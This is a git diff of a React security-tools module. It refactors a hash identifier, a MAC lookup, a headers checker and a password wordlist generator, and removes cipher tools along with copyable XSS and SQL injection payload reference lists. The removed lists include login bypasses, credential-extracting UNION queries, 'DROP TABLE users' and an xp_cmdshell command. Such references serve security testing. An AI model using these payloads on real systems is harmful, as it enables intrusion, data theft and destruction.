@@ -1,6 +1,6 @@
 import { useState, useMemo } from 'react';
 import { ToolInput, ToolButton, ToolError, CopyButton } from '@/components/ToolUI';
-import { Lock, Fingerprint, Network, Cpu, ShieldCheck, Plug, List, Bug, Database, ArrowDownToLine, Search } from 'lucide-react';
+import { Lock, Fingerprint, Network, Cpu, ShieldCheck, List, Search } from 'lucide-react';
 
 // === Password Strength Analyzer ===
 export function PasswordStrengthAnalyzer() {
@@ -98,27 +98,21 @@ export function PasswordStrengthAnalyzer() {
 }
 
 // === Hash Identifier ===
-const HASH_TYPES: { name: string; regex: RegExp; len: number }[] = [
-  { name: 'MD5 (32 hex chars)', regex: /^[a-f0-9]{32}$/, len: 32 },
-  { name: 'MD4 (32 hex chars)', regex: /^[a-f0-9]{32}$/, len: 32 },
-  { name: 'NTLM (32 hex chars)', regex: /^[a-f0-9]{32}$/, len: 32 },
-  { name: 'SHA-1 (40 hex chars)', regex: /^[a-f0-9]{40}$/, len: 40 },
-  { name: 'SHA-224 (56 hex chars)', regex: /^[a-f0-9]{56}$/, len: 56 },
-  { name: 'SHA-256 (64 hex chars)', regex: /^[a-f0-9]{64}$/, len: 64 },
-  { name: 'SHA-384 (96 hex chars)', regex: /^[a-f0-9]{96}$/, len: 96 },
-  { name: 'SHA-512 (128 hex chars)', regex: /^[a-f0-9]{128}$/, len: 128 },
-  { name: 'RIPEMD-160 (40 hex chars)', regex: /^[a-f0-9]{40}$/, len: 40 },
-  { name: 'SHA3-256 (64 hex chars)', regex: /^[a-f0-9]{64}$/, len: 64 },
-  { name: 'SHA3-512 (128 hex chars)', regex: /^[a-f0-9]{128}$/, len: 128 },
-  { name: 'MySQL 323 (16 hex chars)', regex: /^[a-f0-9]{16}$/, len: 16 },
-  { name: 'MySQL 5 / SHA1(SHA1) (40 hex chars)', regex: /^\*[a-f0-9]{40}$/, len: 42 },
-  { name: 'bcrypt ($2a$/$2b$/$2y$)', regex: /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/, len: 60 },
-  { name: 'argon2 ($argon2id$)', regex: /^\$argon2(id|d|i)\$/, len: 0 },
-  { name: 'scrypt ($scrypt$)', regex: /^\$scrypt\$/, len: 0 },
-  { name: 'PBKDF2 ($pbkdf2$)', regex: /^\$pbkdf2/, len: 0 },
-  { name: 'NT Hash (NTLM)', regex: /^[a-f0-9]{32}$/, len: 32 },
-  { name: 'Cisco Type 7', regex: /^[0-9a-f]{4,}$/i, len: 0 },
-  { name: 'JWT (eyJ...)', regex: /^eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$/, len: 0 },
+const HASH_TYPES: { name: string; regex: RegExp }[] = [
+  { name: 'MD5 / MD4 / NTLM (32 hex chars)', regex: /^[a-f0-9]{32}$/i },
+  { name: 'SHA-1 / RIPEMD-160 (40 hex chars)', regex: /^[a-f0-9]{40}$/i },
+  { name: 'SHA-224 (56 hex chars)', regex: /^[a-f0-9]{56}$/i },
+  { name: 'SHA-256 / SHA3-256 (64 hex chars)', regex: /^[a-f0-9]{64}$/i },
+  { name: 'SHA-384 (96 hex chars)', regex: /^[a-f0-9]{96}$/i },
+  { name: 'SHA-512 / SHA3-512 (128 hex chars)', regex: /^[a-f0-9]{128}$/i },
+  { name: 'MySQL 323 (16 hex chars)', regex: /^[a-f0-9]{16}$/i },
+  { name: 'MySQL 5 / SHA1(SHA1) (* + 40 hex)', regex: /^\*[a-f0-9]{40}$/i },
+  { name: 'bcrypt ($2a/$2b/$2y$)', regex: /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/ },
+  { name: 'argon2 ($argon2id$)', regex: /^\$argon2(id|d|i)\$/ },
+  { name: 'scrypt ($scrypt$)', regex: /^\$scrypt\$/ },
+  { name: 'PBKDF2 ($pbkdf2$)', regex: /^\$pbkdf2/ },
+  { name: 'JWT (eyJ...)', regex: /^eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$/ },
+  { name: 'Cisco Type 7 (hex pairs)', regex: /^\d{2}[a-f0-9]+$/i },
 ];
 
 export function HashIdentifier() {
@@ -133,8 +127,7 @@ export function HashIdentifier() {
       if (ht.regex.test(trimmed)) matches.push(ht.name);
     }
     if (matches.length === 0) {
-      const len = trimmed.length;
-      setResults([`No known hash format matched. Length: ${len} characters.`]);
+      setResults([`No known hash format matched. Length: ${trimmed.length} characters.`]);
     } else {
       setResults(matches);
     }
@@ -330,11 +323,7 @@ export function MACVendorLookup() {
     const oui = raw.slice(0, 6);
     const formattedOui = `${oui.slice(0, 2)}:${oui.slice(2, 4)}:${oui.slice(4, 6)}`;
     const vendor = MAC_VENDORS[formattedOui];
-    if (vendor) {
-      setResult({ vendor, oui: formattedOui });
-    } else {
-      setResult({ vendor: 'Unknown vendor (not in local database)', oui: formattedOui });
-    }
+    setResult({ vendor: vendor || 'Unknown vendor (not in local database)', oui: formattedOui });
   };
 
   return (
@@ -387,11 +376,11 @@ export function SecurityHeadersChecker() {
         { header: 'Cross-Origin-Opener-Policy', severity: 'low' },
         { header: 'Cross-Origin-Embedder-Policy', severity: 'low' },
       ];
-      const results = checks.map((c) => {
+      const found = checks.map((c) => {
         const value = headers.get(c.header.toLowerCase());
         return { header: c.header, present: !!value, value: value || 'Not set', severity: c.severity };
       });
-      setResults(results);
+      setResults(found);
     } catch {
       setError('Could not fetch headers. The site may block cross-origin requests (CORS). This is common and does not mean the site is insecure.');
     }
@@ -562,7 +551,7 @@ export function WordlistGenerator() {
       suffixes.push('123', '1234', '12345', '123456', '111', '000', '007', '69', '420', '666', '777', '2024', '2025', '2026', '1!', '12!');
     }
     if (appendSpecial) {
-      ['!', '!!', '@', '#', '$', '!!', '@#', '#1'].forEach((s) => suffixes.push(s));
+      ['!', '!!', '@', '#', '$', '@#', '#1'].forEach((s) => suffixes.push(s));
     }
     words.forEach((word) => {
       suffixes.forEach((suffix) => final.add(word + suffix));
@@ -610,384 +599,6 @@ export function WordlistGenerator() {
       {output && (
         <>
           <ToolInput label="Generated Wordlist" value={output} onChange={() => {}} rows={10} readOnly mono />
-          <CopyButton text={output} />
-        </>
-      )}
-    </div>
-  );
-}
-
-// === Caesar Cipher ===
-export function CaesarCipher() {
-  const [input, setInput] = useState('');
-  const [shift, setShift] = useState(3);
-  const [mode, setMode] = useState<'encrypt' | 'decrypt'>('encrypt');
-  const [output, setOutput] = useState('');
-
-  const process = () => {
-    const actualShift = mode === 'decrypt' ? (26 - (shift % 26)) : (shift % 26);
-    const result = [...input].map((char) => {
-      const code = char.charCodeAt(0);
-      if (code >= 65 && code <= 90) return String.fromCharCode(((code - 65 + actualShift) % 26) + 65);
-      if (code >= 97 && code <= 122) return String.fromCharCode(((code - 97 + actualShift) % 26) + 97);
-      return char;
-    }).join('');
-    setOutput(result);
-  };
-
-  return (
-    <div className="space-y-6">
-      <ToolInput label="Input Text" value={input} onChange={setInput} placeholder="Enter text to encrypt or decrypt..." rows={4} />
-      <div className="flex items-end gap-4">
-        <div className="flex gap-2">
-          <button onClick={() => setMode('encrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'encrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Encrypt</button>
-          <button onClick={() => setMode('decrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'decrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Decrypt</button>
-        </div>
-        <div>
-          <label className="block text-xs text-slate-400 mb-1">Shift (1-25)</label>
-          <input type="number" min={1} max={25} value={shift} onChange={(e) => setShift(Math.max(1, Math.min(25, +e.target.value)))} className="w-20 rounded-lg bg-slate-900 border border-slate-700 px-3 py-2.5 text-white text-center focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
-        </div>
-        <ToolButton onClick={process} disabled={!input.trim()}><Lock className="h-4 w-4" /> Process</ToolButton>
-      </div>
-      {output && (
-        <>
-          <ToolInput label="Result" value={output} onChange={() => {}} rows={4} readOnly mono />
-          <CopyButton text={output} />
-        </>
-      )}
-    </div>
-  );
-}
-
-// === Vigenere Cipher ===
-export function VigenereCipher() {
-  const [input, setInput] = useState('');
-  const [key, setKey] = useState('');
-  const [mode, setMode] = useState<'encrypt' | 'decrypt'>('encrypt');
-  const [output, setOutput] = useState('');
-
-  const process = () => {
-    const cleanKey = key.replace(/[^a-zA-Z]/g, '').toUpperCase();
-    if (!cleanKey) return;
-    let keyIndex = 0;
-    const result = [...input].map((char) => {
-      const code = char.charCodeAt(0);
-      if (code >= 65 && code <= 90) {
-        const shift = cleanKey.charCodeAt(keyIndex % cleanKey.length) - 65;
-        const shifted = mode === 'encrypt' ? (code - 65 + shift) % 26 : (code - 65 - shift + 26) % 26;
-        keyIndex++;
-        return String.fromCharCode(shifted + 65);
-      }
-      if (code >= 97 && code <= 122) {
-        const shift = cleanKey.charCodeAt(keyIndex % cleanKey.length) - 65;
-        const shifted = mode === 'encrypt' ? (code - 97 + shift) % 26 : (code - 97 - shift + 26) % 26;
-        keyIndex++;
-        return String.fromCharCode(shifted + 97);
-      }
-      return char;
-    }).join('');
-    setOutput(result);
-  };
-
-  return (
-    <div className="space-y-6">
-      <ToolInput label="Input Text" value={input} onChange={setInput} placeholder="Enter text..." rows={4} />
-      <div className="flex items-end gap-4">
-        <div className="flex gap-2">
-          <button onClick={() => setMode('encrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'encrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Encrypt</button>
-          <button onClick={() => setMode('decrypt')} className={`px-4 py-2 rounded-lg text-sm font-medium ${mode === 'decrypt' ? 'bg-cyan-500 text-white' : 'bg-slate-700 text-slate-300 hover:bg-slate-600'}`}>Decrypt</button>
-        </div>
-        <div className="flex-1">
-          <label className="block text-xs text-slate-400 mb-1">Keyword</label>
-          <input type="text" value={key} onChange={(e) => setKey(e.target.value)} placeholder="SECRET" className="w-full rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
-        </div>
-        <ToolButton onClick={process} disabled={!input.trim() || !key.trim()}>Process</ToolButton>
-      </div>
-      {output && (
-        <>
-          <ToolInput label="Result" value={output} onChange={() => {}} rows={4} readOnly mono />
-          <CopyButton text={output} />
-        </>
-      )}
-    </div>
-  );
-}
-
-// === ROT13 ===
-export function ROT13Converter() {
-  const [input, setInput] = useState('');
-  const [output, setOutput] = useState('');
-
-  const convert = () => {
-    setOutput([...input].map((char) => {
-      const code = char.charCodeAt(0);
-      if (code >= 65 && code <= 77) return String.fromCharCode(code + 13);
-      if (code >= 78 && code <= 90) return String.fromCharCode(code - 13);
-      if (code >= 97 && code <= 109) return String.fromCharCode(code + 13);
-      if (code >= 110 && code <= 122) return String.fromCharCode(code - 13);
-      return char;
-    }).join(''));
-  };
-
-  return (
-    <div className="space-y-6">
-      <ToolInput label="Input Text" value={input} onChange={setInput} placeholder="Enter text to ROT13..." rows={4} />
-      <ToolButton onClick={convert} disabled={!input.trim()}>ROT13</ToolButton>
-      {output && (
-        <>
-          <ToolInput label="Result" value={output} onChange={() => {}} rows={4} readOnly mono />
-          <CopyButton text={output} />
-        </>
-      )}
-    </div>
-  );
-}
-
-// === Base32 Encode/Decode ===
-const BASE32_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
-
-export function Base32Encode() {
-  const [input, setInput] = useState('');
-  const [output, setOutput] = useState('');
-
-  const encode = () => {
-    const bytes = new TextEncoder().encode(input);
-    let bits = 0, value = 0, result = '';
-    for (const byte of bytes) {
-      value = (value << 8) | byte;
-      bits += 8;
-      while (bits >= 5) {
-        result += BASE32_CHARS[(value >>> (bits - 5)) & 31];
-        bits -= 5;
-      }
-    }
-    if (bits > 0) result += BASE32_CHARS[(value << (5 - bits)) & 31];
-    while (result.length % 8 !== 0) result += '=';
-    setOutput(result);
-  };
-
-  return (
-    <div className="space-y-6">
-      <ToolInput label="Text to Encode" value={input} onChange={setInput} placeholder="Enter text..." rows={4} />
-      <ToolButton onClick={encode} disabled={!input.trim()}>Encode to Base32</ToolButton>
-      {output && (<><ToolInput label="Base32 Output" value={output} onChange={() => {}} rows={4} readOnly mono /><CopyButton text={output} /></>)}
-    </div>
-  );
-}
-
-export function Base32Decode() {
-  const [input, setInput] = useState('');
-  const [output, setOutput] = useState('');
-  const [error, setError] = useState('');
-
-  const decode = () => {
-    try {
-      const cleaned = input.trim().toUpperCase().replace(/=+$/, '');
-      if (!/^[A-Z2-7]+$/.test(cleaned)) { setError('Invalid Base32 input.'); setOutput(''); return; }
-      let bits = 0, value = 0;
-      const bytes: number[] = [];
-      for (const char of cleaned) {
-        const idx = BASE32_CHARS.indexOf(char);
-        value = (value << 5) | idx;
-        bits += 5;
-        if (bits >= 8) {
-          bytes.push((value >>> (bits - 8)) & 255);
-          bits -= 8;
-        }
-      }
-      setOutput(new TextDecoder().decode(new Uint8Array(bytes)));
-      setError('');
-    } catch { setError('Could not decode as Base32.'); }
-  };
-
-  return (
-    <div className="space-y-6">
-      <ToolInput label="Base32 Text" value={input} onChange={setInput} placeholder="JBSWY3DPEBLW64TMMQ====" rows={4} mono />
-      <ToolButton onClick={decode} disabled={!input.trim()}>Decode from Base32</ToolButton>
-      {error && <ToolError message={error} />}
-      {output && (<><ToolInput label="Decoded Text" value={output} onChange={() => {}} rows={4} readOnly /><CopyButton text={output} /></>)}
-    </div>
-  );
-}
-
-// === XSS Payload Reference ===
-const XSS_PAYLOADS: { payload: string; type: string; description: string }[] = [
-  { payload: '<script>alert(1)</script>', type: 'Classic', description: 'Basic script execution' },
-  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler', description: 'onerror event in img tag' },
-  { payload: '<svg onload=alert(1)>', type: 'Event Handler', description: 'onload in SVG element' },
-  { payload: '<body onload=alert(1)>', type: 'Event Handler', description: 'onload in body tag' },
-  { payload: '"><script>alert(1)</script>', type: 'Breakout', description: 'Break out of attribute' },
-  { payload: "'-alert(1)-'", type: 'Breakout', description: 'Break out of JS string' },
-  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe', description: 'JavaScript URI in iframe' },
-  { payload: '<a href="javascript:alert(1)">click</a>', type: 'URI', description: 'JavaScript URI in anchor' },
-  { payload: '<input onfocus=alert(1) autofocus>', type: 'Event Handler', description: 'Autofocus + onfocus' },
-  { payload: '<details open ontoggle=alert(1)>', type: 'Event Handler', description: 'ontoggle in details' },
-  { payload: '<marquee onstart=alert(1)>', type: 'Event Handler', description: 'onstart in marquee' },
-  { payload: '<video src=x onerror=alert(1)>', type: 'Event Handler', description: 'onerror in video' },
-  { payload: 'javascript:alert(1)', type: 'URI', description: 'JavaScript protocol' },
-  { payload: 'data:text/html,<script>alert(1)</script>', type: 'Data URI', description: 'Data URI with script' },
-  { payload: '<embed src="javascript:alert(1)">', type: 'Embed', description: 'JavaScript in embed' },
-  { payload: '<object data="javascript:alert(1)">', type: 'Object', description: 'JavaScript in object' },
-  { payload: '<form><button formaction=javascript:alert(1)>X</button>', type: 'Form', description: 'formaction with JS URI' },
-  { payload: '<meta http-equiv=refresh content="0;javascript:alert(1)">', type: 'Meta', description: 'Meta refresh with JS' },
-  { payload: '<base href="javascript:alert(1)//">', type: 'Base', description: 'Base tag hijacking' },
-  { payload: '<textarea><script>alert(1)</script></textarea>', type: 'Nested', description: 'Script inside textarea' },
-  { payload: '<style>@import url(javascript:alert(1))</style>', type: 'Style', description: 'CSS import with JS' },
-  { payload: '<link rel=stylesheet href="javascript:alert(1)">', type: 'Link', description: 'JS in link stylesheet' },
-  { payload: '<script src=data:text/javascript,alert(1)></script>', type: 'Data URI', description: 'External script via data URI' },
-  { payload: '<xmp><script>alert(1)</script></xmp>', type: 'Deprecated', description: 'XMP tag bypass' },
-  { payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', type: 'Bypass', description: 'noscript context bypass' },
-];
-
-export function XSSPayloadReference() {
-  const [search, setSearch] = useState('');
-  const [copied, setCopied] = useState<number | null>(null);
-  const filtered = XSS_PAYLOADS.filter((p) =>
-    p.payload.toLowerCase().includes(search.toLowerCase()) ||
-    p.type.toLowerCase().includes(search.toLowerCase()) ||
-    p.description.toLowerCase().includes(search.toLowerCase())
-  );
-
-  return (
-    <div className="space-y-6">
-      <div className="flex items-center gap-2">
-        <Search className="h-4 w-4 text-slate-500" />
-        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..."
-          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
-      </div>
-      <div className="space-y-2 max-h-96 overflow-y-auto">
-        {filtered.map((p, i) => (
-          <div key={i} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
-            <div className="flex items-center gap-3 mb-1">
-              <span className="px-2 py-0.5 rounded text-xs font-medium bg-cyan-500/20 text-cyan-400">{p.type}</span>
-              <span className="text-xs text-slate-500">{p.description}</span>
-              <button
-                onClick={() => { navigator.clipboard.writeText(p.payload); setCopied(i); setTimeout(() => setCopied(null), 2000); }}
-                className="ml-auto text-xs px-2 py-1 rounded bg-slate-700 text-slate-300 hover:bg-slate-600"
-              >
-                {copied === i ? 'Copied!' : 'Copy'}
-              </button>
-            </div>
-            <code className="text-sm text-rose-300 font-mono break-all">{p.payload}</code>
-          </div>
-        ))}
-      </div>
-      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No payloads found.</p>}
-    </div>
-  );
-}
-
-// === SQL Injection Payload Reference ===
-const SQLI_PAYLOADS: { payload: string; type: string; description: string }[] = [
-  { payload: "'", type: 'Detection', description: 'Single quote - test for string injection' },
-  { payload: '"', type: 'Detection', description: 'Double quote - test for string injection' },
-  { payload: "' OR '1'='1", type: 'Auth Bypass', description: 'Classic authentication bypass' },
-  { payload: "' OR '1'='1' --", type: 'Auth Bypass', description: 'Bypass with comment' },
-  { payload: "' OR '1'='1' /*", type: 'Auth Bypass', description: 'Bypass with block comment' },
-  { payload: "admin'--", type: 'Auth Bypass', description: 'Bypass login as admin' },
-  { payload: "' UNION SELECT NULL--", type: 'UNION', description: 'UNION with NULL to find column count' },
-  { payload: "' UNION SELECT NULL,NULL--", type: 'UNION', description: 'UNION with 2 columns' },
-  { payload: "' UNION SELECT NULL,NULL,NULL--", type: 'UNION', description: 'UNION with 3 columns' },
-  { payload: "' UNION SELECT username,password FROM users--", type: 'UNION', description: 'Extract credentials' },
-  { payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", type: 'Info Schema', description: 'Enumerate table names' },
-  { payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", type: 'Info Schema', description: 'Enumerate columns' },
-  { payload: "' AND SLEEP(5)--", type: 'Time-based', description: 'Time-based blind (MySQL)' },
-  { payload: "' AND 1=CONVERT(int, (SELECT @@version))--", type: 'Error-based', description: 'Error-based (MSSQL)' },
-  { payload: "' WAITFOR DELAY '0:0:5'--", type: 'Time-based', description: 'Time-based blind (MSSQL)' },
-  { payload: "1; DROP TABLE users--", type: 'Stacked', description: 'Stacked query (MSSQL/PostgreSQL)' },
-  { payload: "' OR 1=1 LIMIT 1--", type: 'Auth Bypass', description: 'Bypass with LIMIT (MySQL)' },
-  { payload: "' UNION ALL SELECT NULL,version()--", type: 'Version', description: 'Get database version (MySQL)' },
-  { payload: "' UNION ALL SELECT NULL,database()--", type: 'Database', description: 'Get current database (MySQL)' },
-  { payload: "' UNION ALL SELECT NULL,user()--", type: 'User', description: 'Get current user (MySQL)' },
-  { payload: "'; EXEC xp_cmdshell('dir')--", type: 'OS Command', description: 'OS command via xp_cmdshell (MSSQL)' },
-  { payload: "' AND (SELECT SUBSTRING(version(),1,1))='5'--", type: 'Boolean Blind', description: 'Boolean-based blind extraction' },
-  { payload: "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", type: 'Boolean Blind', description: 'Test if admin user exists' },
-  { payload: "1 UNION SELECT CAST(table_name AS INT) FROM information_schema.tables--", type: 'Error-based', description: 'Error-based enumeration (PostgreSQL)' },
-  { payload: "' UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--", type: 'Info Schema', description: 'Group concat all tables (MySQL)' },
-];
-
-export function SQLiPayloadReference() {
-  const [search, setSearch] = useState('');
-  const [copied, setCopied] = useState<number | null>(null);
-  const filtered = SQLI_PAYLOADS.filter((p) =>
-    p.payload.toLowerCase().includes(search.toLowerCase()) ||
-    p.type.toLowerCase().includes(search.toLowerCase()) ||
-    p.description.toLowerCase().includes(search.toLowerCase())
-  );
-
-  return (
-    <div className="space-y-6">
-      <div className="flex items-center gap-2">
-        <Search className="h-4 w-4 text-slate-500" />
-        <input type="text" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..."
-          className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
-      </div>
-      <div className="space-y-2 max-h-96 overflow-y-auto">
-        {filtered.map((p, i) => (
-          <div key={i} className="rounded-lg bg-slate-900 border border-slate-700 px-4 py-3">
-            <div className="flex items-center gap-3 mb-1">
-              <span className="px-2 py-0.5 rounded text-xs font-medium bg-amber-500/20 text-amber-400">{p.type}</span>
-              <span className="text-xs text-slate-500">{p.description}</span>
-              <button
-                onClick={() => { navigator.clipboard.writeText(p.payload); setCopied(i); setTimeout(() => setCopied(null), 2000); }}
-                className="ml-auto text-xs px-2 py-1 rounded bg-slate-700 text-slate-300 hover:bg-slate-600"
-              >
-                {copied === i ? 'Copied!' : 'Copy'}
-              </button>
-            </div>
-            <code className="text-sm text-rose-300 font-mono break-all">{p.payload}</code>
-          </div>
-        ))}
-      </div>
-      {filtered.length === 0 && <p className="text-center text-sm text-slate-500">No payloads found.</p>}
-    </div>
-  );
-}
-
-// === HTTP Header Injector ===
-export function HTTPHeaderInjector() {
-  const [headers, setHeaders] = useState([{ key: '', value: '' }]);
-  const [output, setOutput] = useState('');
-
-  const addRow = () => setHeaders([...headers, { key: '', value: '' }]);
-  const removeRow = (i: number) => setHeaders(headers.filter((_, idx) => idx !== i));
-  const update = (i: number, field: 'key' | 'value', val: string) => {
-    setHeaders(headers.map((h, idx) => idx === i ? { ...h, [field]: val } : h));
-  };
-
-  const generate = () => {
-    const valid = headers.filter((h) => h.key.trim());
-    const lines = valid.map((h) => `${h.key.trim()}: ${h.value.trim()}`);
-    setOutput(lines.join('\n'));
-  };
-
-  const generateCurl = () => {
-    const valid = headers.filter((h) => h.key.trim());
-    const flags = valid.map((h) => `-H '${h.key.trim()}: ${h.value.trim()}'`).join(' \\\n  ');
-    setOutput(`curl ${flags} \\\n  https://example.com`);
-  };
-
-  return (
-    <div className="space-y-6">
-      <div className="space-y-3">
-        {headers.map((h, i) => (
-          <div key={i} className="flex gap-3">
-            <input type="text" value={h.key} onChange={(e) => update(i, 'key', e.target.value)} placeholder="Header name (e.g. Authorization)"
-              className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
-            <input type="text" value={h.value} onChange={(e) => update(i, 'value', e.target.value)} placeholder="Header value (e.g. Bearer token123)"
-              className="flex-1 rounded-lg bg-slate-900 border border-slate-700 px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-400/40" />
-            <button onClick={() => removeRow(i)} className="px-3 rounded-lg bg-rose-500/20 text-rose-400 hover:bg-rose-500/30 text-sm">Remove</button>
-          </div>
-        ))}
-      </div>
-      <div className="flex gap-3">
-        <button onClick={addRow} className="px-4 py-2 rounded-lg bg-slate-700 text-slate-300 hover:bg-slate-600 text-sm font-medium">Add Header</button>
-        <ToolButton onClick={generate}>Generate Raw</ToolButton>
-        <ToolButton onClick={generateCurl} variant="secondary">Generate cURL</ToolButton>
-      </div>
-      {output && (
-        <>
-          <ToolInput label="Output" value={output} onChange={() => {}} rows={8} readOnly mono />
           <CopyButton text={output} />
         </>
       )}
